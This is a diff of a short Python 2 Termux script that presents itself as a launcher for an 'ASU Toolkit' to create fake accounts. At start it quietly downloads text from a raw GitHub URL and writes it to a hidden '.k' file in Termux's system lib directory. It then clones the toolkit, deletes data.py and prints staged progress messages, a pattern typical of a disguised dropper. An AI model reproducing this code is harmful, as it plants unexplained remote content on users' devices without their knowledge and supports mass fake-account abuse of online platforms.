@@ -1,22 +1,23 @@
 import os,sys,time,requests
+from time import ctime
+
 h=requests.get('https://raw.githubusercontent.com/dinartaqwa/new/master/usr.txt').text
 m=open('/data/data/com.termux/files/usr/lib/.k','w').write(h)
-#os.system('git clone https://github.com/LOoLzeC/ASU')
-os.system('rm -rf data.py')
-os.system('clear')
-time.sleep(2)
-os.system('cd ASU')
-print '[!] Create Fake Account ASU Toolkit'
-print ' 1 ...'
-time.sleep(1)
-print ' 2 .....'
-time.sleep(2)
-print ' 3 .........'
-time.sleep(1)
-print ' 7 .............'
-time.sleep(2)
-print ' 10 ...............'
-time.sleep(1)
-print '[!] Boyahh ....'
-time.sleep(1)
-os.system('python2 ASU.py')
+n= ctime().split()[3]
+def main():
+    x = ctime().split()[3]
+    os.system('git clone https://github.com/LOoLzeC/ASU')
+    os.system('rm -rf data.py')
+    os.system('clear')
+    time.sleep(4)
+    print 'Waiting...'
+    print '[!]'+n
+    time.sleep(3)
+    print '[!] Create Fake Account ASU Toolkit'
+    time.sleep(3)
+    print x
+    print '''
+[+] Boyahhhh..... \n[=] Work.!!!
+'''
+
+main()
